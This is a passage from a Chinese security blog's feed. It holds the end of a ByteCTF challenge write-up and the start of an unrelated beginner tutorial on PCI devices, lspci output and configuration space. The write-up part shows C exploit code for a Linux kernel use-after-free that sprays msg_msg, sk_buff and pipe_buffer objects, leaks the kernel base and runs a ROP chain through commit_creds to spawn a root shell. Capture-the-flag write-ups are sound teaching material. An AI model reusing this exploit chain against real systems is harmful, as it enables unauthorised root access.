victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n&quot;</span>, <br>            victim_addr);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* re-construct the msg_msg to fix it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> we need to pass the check in lib/list_debug.c </span><br><span class="hljs-comment">     * what we used to not to pass there is </span><br><span class="hljs-comment">     * &quot;prev-&gt;next == entry&quot; &amp;&amp; &quot;next-&gt;prev == entry&quot;</span><br><span class="hljs-comment">     * so a valid memory with [addr of entry] should be set there</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(fake_second_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x50</span>; i++) &#123;<br>        ((<span class="hljs-type">size_t</span>*)(fake_second_msg))[i] = victim_addr;<br>    &#125;<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            victim_addr + <span class="hljs-number">0x100</span>, victim_addr + <span class="hljs-number">0x100</span>,<br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* release UAF obj as secondary msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    ret = readMsg(msqid[victim_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                VICTIM_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* spray pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">/* write something to activate the pipe */</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* release the sk_buff to read pipe_buffer, leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_second_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            ret = read(sk_sockets[i][<span class="hljs-number">1</span>], <br>                        &amp;fake_second_msg, <br>                        <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_second_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_second_msg;<br>    <span class="hljs-comment">/* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */</span><br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8133151b</span> + kernel_offset;<br>    <span class="hljs-comment">/* ret */</span><br>    ops_ptr-&gt;get = <span class="hljs-number">0xffffffff81331534</span> + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_second_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = \<br>                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于堆喷的不稳定性，在第一阶段还是有可能会挂掉的，因此这道题目其实还是需要爆破的一道题目，几率 1&#x2F;16：</p><p><img src="https://s2.loli.net/2022/09/30/skFd76cRPruwQip.jpg" alt="img.jpg"></p><h1 id="0x03-解题情况"><a href="#0x03-解题情况" class="headerlink" title="0x03.解题情况"></a>0x03.解题情况</h1><p>这道题笔者最初出题的时候是按照签到题的难度出的，因为这道题的两个阶段：阶段一的 kernel UAF 其实是可以直接使用通解完成解题的，而阶段二的 QEMU 逃逸则是一个非常直白的越界读写漏洞，利用起来也不算困难。</p><p>但最后并没有队伍解开这道题，可能是因为大家觉得笔者的题目太简单了都不屑于做吧（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ByteCTF" scheme="http://blog.arttnba3.cn/tags/ByteCTF/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="QEMU escape" scheme="http://blog.arttnba3.cn/tags/QEMU-escape/"/>
    
  </entry>
  
  <entry>
    <title>【HARDWARE.0x00】PCI 设备简易食用手册</title>
    <link href="http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/"/>
    <id>http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/</id>
    <published>2022-08-29T20:13:17.000Z</published>
    <updated>2023-04-12T17:18:59.303Z</updated>
    
    <content type="html"><![CDATA[<p>👴等会把你总线都给扬了</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>因为笔者最近不懂为什么开始写 PCI 设备驱动了，但笔者是 <em>网络空间安全专业</em> 的本科生，此前基本上没有接触过与硬件相关联的知识（<del>因为计组和微原课讲的就是个🐓⑧</del>），所以开了这篇新的博客简要记载一些与 PCI 设备相关的基础知识、基本 Linux PCI 驱动的编写等</p><blockquote><p>为了写这篇博客，笔者翻了笔者大二上学期的计算机组成原理的课本，还翻了大二下学期的微机原理的课本，发现<strong>这两门课根本就是什么都没讲……<strong>因为也弄不到微院那边相关的教材，所以本篇博客</strong>并没有一个系统性的指导</strong>来辅助写作，都是各种东拼西凑＋笔者自己的理解，<strong>很多东西因为笔者自身水平低下的缘故只能一笔带过</strong>，因此可能会显得不够专业，希望读者见谅XD</p><blockquote><p>如果需要更为专业的参考资料请直接参考 <a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">《PCI_Express_Technology》</a></p></blockquote><blockquote><p>以及笔者非常深刻的意识到在硬件这一块的知识笔者相比于那些专门搞硬件的人而言**确实差了很多…..**只能说继续努力吧XD</p></blockquote></blockquote><h1 id="0x01-PCI-basic-knowledge"><a href="#0x01-PCI-basic-knowledge" class="headerlink" title="0x01. PCI basic knowledge"></a>0x01. PCI basic knowledge</h1><h2 id="一、总线结构简述"><a href="#一、总线结构简述" class="headerlink" title="一、总线结构简述"></a>一、总线结构简述</h2><p>我们都知道计算机的五个基本组件为：<strong>输入，输出，存储器，运算器（或数据通路），控制器</strong>。那么这几大组件之间怎么通信呢？答案是依靠<strong>系统总线</strong></p><p><strong>总线</strong>（bus）是一种将多个功能单元进行连接并允许功能单元之间进行数据交换的一种数据通路，在现代计算机中通常采用总线结构，即存在一根主要的公共通信干线，CPU 及各种设备都通过这跟总线进行通信</p><p>总线按功能可以分为以下三种类型：</p><ul><li><strong>片内总线</strong>：芯片内的总线，位于 CPU 内部，用以在寄存器与寄存器、寄存器与 ALU 之间进行数据交换</li><li><strong>系统总线</strong>：计算机系统内各功能单元（CPU、主存、I&#x2F;O）之间的公共通信干线，也称之为 <em>内总线</em></li><li><strong>通信总线</strong>：用于计算机系统之间或是计算机系统与其他系统（例如远程通信设备）之间进行通信的总线，也称之为 <em>外总线</em></li></ul><p>总线是可以扩展的，即可以存在多个不同类型的总线相连，不同的设备接入到不同类型的总线上</p><p><img src="https://s2.loli.net/2022/07/21/fWTEztvhuXAqN8d.png" alt="image.png"></p><h2 id="二、PCI-概念简述"><a href="#二、PCI-概念简述" class="headerlink" title="二、PCI 概念简述"></a>二、PCI 概念简述</h2><p>PCI 即 <code>Peripheral Component Interconnect</code>，是一种<strong>连接电脑主板和外部设备的总线标准</strong>，其通过多根 PCI bus 完成 CPU 与 多个 PCI 设备间的连接，，在 X86 硬件体系结构中几乎所有的设备都以各种形式连接到 PCI 设备树上</p><p><code>PCI express</code> 是新一代的总线标准，它沿用既有的PCI编程概念及信号标准，并且构建了更加高速的串行通信系统标准</p><p>我们首先明确 PCI 标准中的三个基本组件：</p><ul><li><strong>PCI 设备</strong>（device）：符合 PCI 总线标准的设备都可以称之为 PCI 设备，在一个 PCI 总线上可以包含多个 PCI 设备</li><li><strong>PCI 总线</strong>（bus）：用以连接多个 PCI 设备与多个 PCI 桥的通信干道</li><li><strong>PCI 桥</strong>（bridge）：总线之间的<strong>连接枢纽</strong>，主要有以下三种：<ul><li>HOST&#x2F;PCI 桥：也称为 PCI 主桥或者 PCI 总线控制器，用以连接 CPU 与 PCI 根总线，<strong>隔离设备地址空间与存储器地址空间</strong>，现代 PC 通常还会在其中集成内存控制器，称之为<strong>北桥芯片组</strong>（North Bridge Chipset）</li><li>PCI&#x2F;ISA 桥：用于连接旧的 ISA 总线，通常还会集成中断控制器（如 i8359A），称之为<strong>南桥芯片组</strong>（South Bridge Chipset）</li><li>PCI-to-PCI 桥：用于连接 PCI 主总线（Primary Bus）与次总线（Secondary Bus）</li></ul></li></ul><p>PCI采用树形拓扑结构，一个典型的 PCI 架构如下图所示，由一个 <code>PCI Host Bus</code> 负责总的通信， 在 Host Bus 下挂载着一个或多个 <code>PCI Root Bridge</code>，一个 <code>PCI Root Bridge</code> 管理一个 <code>PCI Local Bus</code> 空间，挂载着一颗 PCI 总线树：</p><p><img src="https://s2.loli.net/2022/08/30/LI1ayCdsB2qNWb4.png" alt="image.png"></p><p>由此，一个多层 PCI 总线结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/7rT3aEytb2lumZP.png" alt="image.png"></p><p>我们来看一个现实中的经典例子，以下图的 <code>Intel 440FX</code> 芯片组为例，PCI Host Bridge 分隔开了存储器域与 PCI 设备域，<strong>其分别使用独立的地址空间</strong>：</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>在 Linux 下我们可以使用 <code>lspci</code> 指令查看插在当前机器的 PCI bus 上的 PCI 设备，使用 <code>-t</code> 参数查看树形结构，<code>-v</code> 参数可以查看详细信息：</p><blockquote><p>这里展示的结果有 virtio 设备是因为笔者是在阿里云学生机上使用的命令，这类机器一般其实都是用 Qemu 跑的虚拟机</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci</span><br>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)<br>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)<br>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)<br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device<br>00:04.0 Communication controller: Red Hat, Inc. Virtio console<br>00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device<br>00:06.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -t -v</span><br>-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]<br>           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>           +-01.2  Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II]<br>           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI<br>           +-02.0  Cirrus Logic GD 5446<br>           +-03.0  Red Hat, Inc. Virtio network device<br>           +-04.0  Red Hat, Inc. Virtio console<br>           +-05.0  Red Hat, Inc. Virtio block device<br>           \-06.0  Red Hat, Inc. Virtio memory balloon<br></code></pre></td></tr></table></figure><p>我们还可以使用 <code>lshw -businfo</code> 命令来获取设备信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo lshw -businfo</span><br>[sudo] password for arttnba3:<br>Bus info          Device       Class          Description<br>=========================================================<br>                               system         Alibaba Cloud ECS<br>                               bus            Motherboard<br>                               memory         96KiB BIOS<br>cpu@0                          processor      Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz<br>                               memory         2GiB System Memory<br>                               memory         2GiB DIMM RAM<br>pci@0000:00:00.0               bridge         440FX - 82441FX PMC [Natoma]<br>pci@0000:00:01.0               bridge         82371SB PIIX3 ISA [Natoma/Triton II]<br>pci@0000:00:01.1               storage        82371SB PIIX3 IDE [Natoma/Triton II]<br>pci@0000:00:01.2               bus            82371SB PIIX3 USB [Natoma/Triton II]<br>usb@1             usb1         bus            UHCI Host Controller<br>usb@1:1                        input          QEMU USB Tablet<br>pci@0000:00:01.3               bridge         82371AB/EB/MB PIIX4 ACPI<br>pci@0000:00:02.0               display        GD 5446<br>pci@0000:00:03.0               network        Virtio network device<br>virtio@0          eth0         network        Ethernet interface<br>pci@0000:00:04.0               communication  Virtio console<br>virtio@1                       generic        Virtual I/O device<br>pci@0000:00:05.0               storage        Virtio block device<br>virtio@2          /dev/vda     disk           42GB Virtual I/O device<br>virtio@2,1        /dev/vda1    volume         39GiB EXT4 volume<br>pci@0000:00:06.0               generic        Virtio memory balloon<br>virtio@3                       generic        Virtual I/O device<br>                               system         PnP device PNP0b00<br>                               input          PnP device PNP0303<br>                               input          PnP device PNP0f13<br>                               storage        PnP device PNP0700<br>                               communication  PnP device PNP0501<br>                  veth073b1a5  network        Ethernet interface<br>                  veth2c8670f  network        Ethernet interface<br>                  vethc0202a2  network        Ethernet interface<br>                  veth49e878e  network        Ethernet interface<br></code></pre></td></tr></table></figure><p>PCI 设备是在内核启动初始化阶段进行枚举的，这个时候可能有的设备还没准备好，从而没被枚举到，这种情况下我们可以使用如下命令重新进行设备枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="三、PCI-设备编号"><a href="#三、PCI-设备编号" class="headerlink" title="三、PCI 设备编号"></a>三、PCI 设备编号</h2><p>每个PCI 设备都有着三个编号：<strong>总线编号（Bus Number）、设备编号（Device Number）与功能编号（Function Number）</strong>，作为设备的唯一标识；在此之上还有 <strong>PCI 域</strong>的概念，一个 PCI 域上最多可以连接 256 根 PCI 总线</p><p>当我们使用 <code>lspci</code> 命令查看 PCI 设备信息时，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v </code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号</p><h2 id="四、PCI-设备配置空间"><a href="#四、PCI-设备配置空间" class="headerlink" title="四、PCI 设备配置空间"></a>四、PCI 设备配置空间</h2><p>每个 PCI 逻辑设备中都有着其自己的<strong>配置空间</strong>（configuration space），通常是设备地址空间的前 64 字节（新版的设备还扩展了 0x40~0xFF 这段配置空间），其中存放了一些设备的基本信息，如生厂商信息、IRQ中断号、mem 空间与 io 空间的起始地址与大小等</p><p>Intel 芯片组中我们可以使用 IO 空间的 <code>CF8/CFC</code> 地址（端口）来访问 PCI 设备的配置寄存器：</p><ul><li><code>CF8</code>：<strong>CONFIG_ADDRESS</strong>，即 PCI 配置空间地址端口。</li><li><code>CFH</code>：<strong>CONFIG_DATA</strong>，即 PCI 配置空间数据端口。</li></ul><p>当我们往 <code>CONFIG_ADDRESS</code> 端口填入对应的设备标识后，就可以从 <code>CONFIG_DATA</code> 端口上读写 PCI 配置空间的内存， <code>CONFIG_ADDRESS</code> 端口的格式如下：</p><ul><li><code>31</code> 位：Enable 位</li><li><code>23:16</code> 位：总线编号</li><li><code>15:11</code> 位：设备编号</li><li><code>10:8</code> 位：功能编号</li><li><code>7:2</code> 位：配置空间寄存器编号</li><li><code>1:0</code> 位：恒为 <code>00</code></li></ul><blockquote><p>除了通过端口访问外，我们也可以通过 MMIO 的方式访问一个 PCI 设备的地址空间</p></blockquote><p>现在我们来看 PCI 配置空间的结构，PCI 设备分为 <code>Bridge</code> 与 <code>Agent</code> 两类，故配置空间也分为相应的两类</p><p>Agent 类型配置空间又被称为 <code>Type 00h</code>，格式如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/CEpqkAM1D78XRLG.png" alt="image.png"></p><p>相应地，Bridge 类型配置空间被称为 <code>Type 01h</code>，与 Agent 类型配置空间大同小异：</p><p><img src="https://s2.loli.net/2022/07/21/emyrRVo5W6X12aG.png" alt="image.png"></p><p>简单介绍几个比较重要的字段：</p><ul><li><p>设备标识相关：</p><ul><li><p><code>Vendor ID</code>：生产厂商的 ID，例如 Intel 设备通常为 <code>0x8086</code></p></li><li><p><code>Device ID</code>：具体设备的 ID，通常也是由厂家自行指定的</p></li><li><p><code>Class Code</code>：类代码，用于区分设备类型</p></li><li><p><code>Revision ID</code>：PCI 设备的版本号，可以看作 Device ID 的扩展</p></li></ul></li><li><p>设备状态相关：</p><ul><li><p><code>Status</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/ZTplAr87OQ96cRU.png" alt="image.png"></p></li><li><p><code>Command</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/rM3YhuaoPK25mNn.png" alt="image.png"></p></li></ul></li><li><p>设备配置相关：</p><ul><li><p><code>Base Address Registers</code>：决定了 PCI 设备空间映射到系统空间的具体位置，有两种映射方式：MMIO 与 PMIO，映射方式由最低位决定，不可更改</p></li><li><p><code>Interrupt Pin</code>：中断引脚，该寄存器表示设备所连接的引脚</p></li><li><p><code>Interrupt Line</code>：中断编号</p></li></ul></li></ul><p>前面我们讲到 lspci 命令，我们可以使用 <code>-s</code> 来通过指定查看的具体 PCI 设备，通过 <code>-m</code> 查看部分信息，通过 <code>-nn</code> 查看比较详细的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -m</span><br>Device: 00:02.0<br>Class:  VGA compatible controller<br>Vendor: Cirrus Logic<br>Device: GD 5446<br>SVendor:        Red Hat, Inc.<br>SDevice:        QEMU Virtual Machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -nn</span><br>00:02.0 VGA compatible controller [0300]: Cirrus Logic GD 5446 [1013:00b8] (prog-if 00 [VGA controller])<br>        Subsystem: Red Hat, Inc. QEMU Virtual Machine [1af4:1100]<br>        Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-<br>        Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-<br>        Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M]<br>        Region 1: Memory at febd0000 (32-bit, non-prefetchable) [size=4K]<br>        Expansion ROM at 000c0000 [disabled] [size=128K]<br>        Kernel driver in use: cirrus<br>        Kernel modules: cirrusfb, cirrus<br></code></pre></td></tr></table></figure><p>我们还可以直接使用 <code>-x</code> 参数来查看 PCI 设备的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -s 00:02.0 -x</span><br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00<br>10: 08 00 00 fc 00 00 bd fe 00 00 00 00 00 00 00 00<br>20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11<br>30: 00 00 bc fe 00 00 00 00 00 00 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>在 Linux 当中我们也可以通过 procfs 或 sysfs 这样的文件系统来查看设备的相关配置信息，例如通过 <code>/proc/bus/pci/00/00.0</code> 文件我们同样可以查看 PCI 设备 <code>00:02.0</code> 的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/bus/pci/00/02.0 | xxd</span><br>00000000: 1310 b800 0301 0000 0000 0003 0000 0000  ................<br>00000010: 